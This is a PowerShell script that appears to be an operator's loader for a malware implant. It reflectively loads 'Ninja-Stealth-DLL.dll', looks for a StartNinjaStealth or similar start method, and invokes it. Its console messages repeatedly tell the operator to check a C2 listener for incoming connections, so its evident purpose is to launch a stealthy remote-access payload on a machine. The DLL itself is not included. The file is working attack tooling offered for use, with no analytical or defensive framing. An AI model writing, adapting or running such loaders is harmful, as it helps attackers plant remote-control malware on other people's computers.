# PowerShell DLL Loader for Ninja Stealth
# Load Ninja-Stealth-DLL.dll using reflection

$ErrorActionPreference = "Stop"

Write-Host "🥷 Ninja DLL Loader - Loading stealth module..." -ForegroundColor Green

try {
    # Get the current directory
    $scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
    $dllPath = Join-Path $scriptPath "..\bin\Ninja-Stealth-DLL.dll"
    
    # Check if DLL exists
    if (-not (Test-Path $dllPath)) {
        Write-Host "❌ DLL not found at: $dllPath" -ForegroundColor Red
        Write-Host "📁 Make sure Ninja-Stealth-DLL.dll is in the bin directory" -ForegroundColor Yellow
        exit 1
    }
    
    Write-Host "📦 Loading DLL from: $dllPath" -ForegroundColor Cyan
    
    # Load the DLL using reflection
    $assembly = [Reflection.Assembly]::LoadFrom($dllPath)
    Write-Host "✅ DLL loaded successfully!" -ForegroundColor Green
    
    # Get the NinjaStealth type
    $ninjaType = $assembly.GetType("NinjaStealth")
    if ($null -eq $ninjaType) {
        Write-Host "⚠️  NinjaStealth type not found, trying alternative..." -ForegroundColor Yellow
        $ninjaType = $assembly.GetTypes() | Where-Object { $_.Name -like "*Ninja*" } | Select-Object -First 1
    }
    
    if ($null -ne $ninjaType) {
        Write-Host "🎯 Found type: $($ninjaType.FullName)" -ForegroundColor Cyan
        
        # Look for StartNinjaStealth method
        $method = $ninjaType.GetMethod("StartNinjaStealth")
        if ($null -ne $method) {
            Write-Host "🔥 Starting Ninja Stealth..." -ForegroundColor Green
            $result = $method.Invoke($null, @())
            Write-Host "✅ Ninja Stealth started! Check your listener." -ForegroundColor Green
        } else {
            Write-Host "⚠️  StartNinjaStealth method not found, trying alternative methods..." -ForegroundColor Yellow
            
            # Try to find any public static method
            $methods = $ninjaType.GetMethods([Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)
            $startMethod = $methods | Where-Object { $_.Name -like "*Start*" -or $_.Name -like "*Ninja*" } | Select-Object -First 1
            
            if ($null -ne $startMethod) {
                Write-Host "🚀 Starting via method: $($startMethod.Name)" -ForegroundColor Green
                $result = $startMethod.Invoke($null, @())
                Write-Host "✅ Ninja Stealth activated!" -ForegroundColor Green
            } else {
                Write-Host "❌ No suitable start method found" -ForegroundColor Red
            }
        }
    } else {
        Write-Host "❌ Could not find Ninja-related type in assembly" -ForegroundColor Red
        Write-Host "📋 Available types:" -ForegroundColor Yellow
        $assembly.GetTypes() | ForEach-Object { Write-Host "  - $($_.Name)" -ForegroundColor Gray }
    }
    
} catch [Reflection.TargetInvocationException] {
    Write-Host "⚠️  Target invocation error: $($_.Exception.InnerException.Message)" -ForegroundColor Red
    Write-Host "💡 This might be normal if the ninja is running in background" -ForegroundColor Yellow
    Write-Host "🔍 Check your listener for incoming connection" -ForegroundColor Cyan
    
} catch [System.UnauthorizedAccessException] {
    Write-Host "❌ Access denied! Run PowerShell as Administrator" -ForegroundColor Red
    
} catch [System.BadImageFormatException] {
    Write-Host "❌ Architecture mismatch! Ensure DLL matches PowerShell architecture" -ForegroundColor Red
    Write-Host "💡 Try: 64-bit PowerShell for 64-bit DLL, 32-bit PowerShell for 32-bit DLL" -ForegroundColor Yellow
    
} catch {
    Write-Host "❌ Error loading DLL: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "📄 Error details:" -ForegroundColor Yellow
    Write-Host $_.Exception -ForegroundColor Gray
    
} finally {
    Write-Host ""
    Write-Host "🥷 Ninja DLL loader completed!" -ForegroundColor Green
    Write-Host "📡 Check your C2 listener for incoming connections" -ForegroundColor Cyan
}

# Keep PowerShell open to see any error messages
Write-Host ""
Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")